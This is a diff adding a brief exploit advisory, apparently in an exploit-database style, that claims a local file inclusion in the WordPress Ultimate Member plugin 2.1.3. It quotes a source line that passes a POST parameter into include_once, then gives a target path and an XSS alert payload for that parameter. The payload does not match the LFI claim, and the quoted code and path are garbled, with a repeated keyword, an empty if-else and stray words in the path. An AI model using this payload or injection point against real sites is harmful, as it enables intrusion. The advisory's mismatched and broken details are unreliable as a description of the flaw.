@@ -1,0 +1,19 @@
+# Title  : WordPress Plugin ultimate-member 2.1.3 - Local File Inclusion
+# Author : mehran feizi
+# Vendor : https://wordpress.org/plugins/ultimate-member/
+# Category : Webapps
+# Date : 2020-02-11
+# Vendor home page: https://wordpress.org/plugins/ultimate-member/
+
+Vulnerable Page:
+/class-admin-upgrade.php
+
+
+Vulnerable Source:
+354: if(empty($_POST['pack'])) else
+356: include_once include_once $this->packages_dir . DIRECTORY_SEPARATOR . $_POST['pack'] . DIRECTORY_SEPARATOR . 'init.php';
+
+
+Exploit:
+localhost/wp-content/plugins/worprees plugin bug dar/ultimate-member/includes/admin/core/class-admin-upgrade.php
+$_POST('pack')=<script>alert('xss')</script>
